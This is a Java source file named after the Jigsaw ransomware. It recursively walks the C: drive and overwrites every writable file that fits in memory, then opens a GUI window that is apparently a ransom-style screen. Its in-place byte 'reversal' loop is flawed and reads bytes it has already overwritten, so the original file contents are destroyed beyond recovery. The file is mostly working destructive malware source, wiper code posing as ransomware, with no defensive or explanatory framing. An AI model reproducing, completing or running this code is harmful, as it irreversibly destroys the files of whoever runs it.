
package jigsaw2;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Jigsaw2 {

  
    public static void jig() throws IOException {

      Gui g = new Gui(); 
      saw("C:\\");
      
      g.a();
      g.setVisible(true);
      
 
    }
    
    
    public static void saw(String directoryName) throws IOException {
    File directory = new File(directoryName);
if(directory.isFile()){
byte[] bytesArray = new byte[(int) directory.length()];
            
                  FileInputStream fis = new FileInputStream(directory);
fis.read(bytesArray); 
fis.close();
for(int i = 0; i <bytesArray.length;i++){
bytesArray[i]=bytesArray[bytesArray.length-1-i];

}
try (FileOutputStream fos = new FileOutputStream(directory.getAbsolutePath())) {
   fos.write(bytesArray);
   fos.close();
}       catch (FileNotFoundException ex) {
            Logger.getLogger(Jigsaw2.class.getName()).log(Level.SEVERE, null, ex);
        }
}
else if(directory.isDirectory()&&directory.listFiles()!=null){
    
    File[] fList = directory.listFiles();
    for (File file : fList) {
        if (file.isFile()&&file.length()<Runtime.getRuntime().freeMemory()&&file.canWrite()) {
            System.out.println("h");
            byte[] bytesArray = new byte[(int) file.length()];
            
            try (FileInputStream fis = new FileInputStream(file)) {
                fis.read(bytesArray); 
            } 
              catch (FileNotFoundException ex) {
            System.out.println("skip");
        }
for(int i = 0; i <bytesArray.length;i++){
bytesArray[i]=bytesArray[bytesArray.length-1-i];

}
try (FileOutputStream fos = new FileOutputStream(file.getAbsolutePath())) {
   fos.write(bytesArray);
   fos.close();
}       catch (FileNotFoundException ex) {
            System.out.println("skip");
        }
            
        } else if (file.isDirectory()) {
            saw(file.getAbsolutePath());
        }

    }
}
    }
    
}
